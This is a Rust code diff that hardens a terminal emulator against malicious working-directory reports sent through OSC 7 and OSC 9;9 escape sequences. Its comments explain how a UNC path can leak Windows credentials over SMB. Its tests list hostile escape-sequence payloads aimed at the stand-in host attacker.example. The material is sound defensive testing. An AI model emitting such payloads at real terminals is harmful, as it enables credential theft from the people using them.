@@ -720,7 +720,9 @@ impl Extractor {
         }
         // OSC 7 cwd report (`7;file://host/abs/path`).
         if mode == Mode::Osc && seq.starts_with(b"7;") {
-            if let Some(path) = parse_osc7(&String::from_utf8_lossy(&seq[2..])) {
+            if let Some(path) =
+                parse_osc7(&String::from_utf8_lossy(&seq[2..])).and_then(safe_reported_cwd)
+            {
                 out.push(Chunk::Cwd(path));
             }
             return;
@@ -743,7 +745,7 @@ impl Extractor {
         // notification. Surfaces the same Chunk::Cwd as OSC 7 (last-writer-wins;
         // both are shell-volunteered truth).
         if mode == Mode::Osc && seq.starts_with(b"9;9;") {
-            if let Some(path) = parse_osc9_9(&seq[4..]) {
+            if let Some(path) = parse_osc9_9(&seq[4..]).and_then(safe_reported_cwd) {
                 out.push(Chunk::Cwd(path));
             }
             return;
@@ -1072,6 +1074,45 @@ fn parse_osc9_9(payload: &[u8]) -> Option<String> {
     } else {
         Some(trimmed.to_string())
     }
+}
+
+/// The last gate between a cwd a program CLAIMED and one kettle will act on.
+///
+/// Both OSC 7 and OSC 9;9 are volunteered by whatever is writing to the pane,
+/// which includes anything a user runs, `cat`s, or is shown over ssh. Kettle
+/// then hands the value to `is_dir`, to a new tab's working directory, and to
+/// "open in file manager".
+///
+/// A **UNC path** is the sharp one. Emitting `OSC 9;9;` followed by a
+/// double-backslash server path costs a program one line of output; on Windows
+/// the very next existence check reaches out over SMB or WebDAV to a host of
+/// the attacker's choosing, and the handshake offers up the machine's
+/// credentials before anything has been opened. Nothing legitimate reports a
+/// cwd this way — a shell integration reports where the shell already is.
+///
+/// Rejected: an empty path, one starting with two separators in any mix (every
+/// Windows UNC and device form begins with two, and a leading `//` is
+/// implementation-defined even on POSIX), one carrying a control character (a
+/// real path has none, and they corrupt every place this is later displayed or
+/// quoted), and one longer than any real path.
+fn safe_reported_cwd(path: String) -> Option<String> {
+    // Comfortably past Windows' extended-length limit and Linux's PATH_MAX,
+    // so a real path is never refused and an unbounded one never stored.
+    const MAX_REPORTED_CWD_BYTES: usize = 8192;
+
+    let is_separator = |c: char| c == '/' || c == '\\';
+    let mut chars = path.chars();
+    let leads_with_two_separators =
+        chars.next().is_some_and(is_separator) && chars.next().is_some_and(is_separator);
+
+    if path.is_empty()
+        || path.len() > MAX_REPORTED_CWD_BYTES
+        || leads_with_two_separators
+        || path.chars().any(char::is_control)
+    {
+        return None;
+    }
+    Some(path)
 }
 
 /// The machine's hostname for OSC 7 validation. Asks the OS
@@ -1628,6 +1669,75 @@ mod tests {
             .flatten()
             .collect();
         assert_eq!(passed, b"$ ");
+    }
+
+    /// A reported cwd is a claim by whatever is writing to the pane, and kettle
+    /// acts on it — `is_dir`, a new tab's working directory, "open in file
+    /// manager".
+    ///
+    /// The sharp case is a UNC path. One line of output sets the pane's cwd to
+    /// a server of the attacker's choosing, and on Windows the very next
+    /// existence check reaches out over SMB or WebDAV, handing over the
+    /// machine's credentials during the handshake — before anything is opened.
+    /// `cat`ting a hostile file is enough to send it. Both report channels are
+    /// covered, since OSC 7 carries a path just as OSC 9;9 does.
+    #[test]
+    fn a_reported_cwd_that_would_reach_off_this_machine_is_refused() {
+        let refused: &[&[u8]] = &[
+            // UNC, the credential-leak shape, in both spellings.
+            b"\x1b]9;9;\\\\attacker.example\\share\x07",
+            b"\x1b]9;9;//attacker.example/share\x07",
+            // Mixed separators reach the same place.
+            b"\x1b]9;9;\\/attacker.example/share\x07",
+            b"\x1b]9;9;/\\attacker.example\\share\x07",
+            // The Windows device and extended-length UNC forms.
+            b"\x1b]9;9;\\\\?\\UNC\\attacker.example\\share\x07",
+            b"\x1b]9;9;\\\\.\\pipe\\anything\x07",
+            // Quoted, since prompts quote paths with spaces.
+            b"\x1b]9;9;\"\\\\attacker.example\\share\"\x07",
+            // And through OSC 7, which carries a path the same way.
+            b"\x1b]7;file://localhost//attacker.example/share\x07",
+        ];
+        for payload in refused {
+            let mut ex = Extractor::new();
+            let out = ex.feed(payload);
+            assert!(
+                !out.iter().any(|c| matches!(c, Chunk::Cwd(_))),
+                "a cwd reaching off this machine must be refused: {:?} produced {out:?}",
+                String::from_utf8_lossy(payload)
+            );
+        }
+
+        // A control character in a path is not a path, and it corrupts every
+        // place the value is later displayed or quoted.
+        let mut ex = Extractor::new();
+        assert!(
+            !ex.feed(b"\x1b]9;9;C:\\ok\x1b]0;title\x07")
+                .iter()
+                .any(|c| matches!(c, Chunk::Cwd(_))),
+            "a cwd carrying a control character must be refused"
+        );
+
+        // Ordinary reports still work — the guard must not simply say no.
+        for (payload, want) in [
+            (
+                &b"\x1b]9;9;C:\\Users\\me\\proj\x07"[..],
+                "C:\\Users\\me\\proj",
+            ),
+            (&b"\x1b]9;9;/home/me/proj\x07"[..], "/home/me/proj"),
+            (
+                &b"\x1b]7;file://localhost/home/me/proj\x07"[..],
+                "/home/me/proj",
+            ),
+        ] {
+            let mut ex = Extractor::new();
+            let out = ex.feed(payload);
+            assert!(
+                out.iter().any(|c| matches!(c, Chunk::Cwd(p) if p == want)),
+                "an ordinary cwd must still be reported: {:?} produced {out:?}",
+                String::from_utf8_lossy(payload)
+            );
+        }
     }
 
     /// v2.29.0: OSC 9;9 (ConEmu "set working directory") is consumed as a Cwd
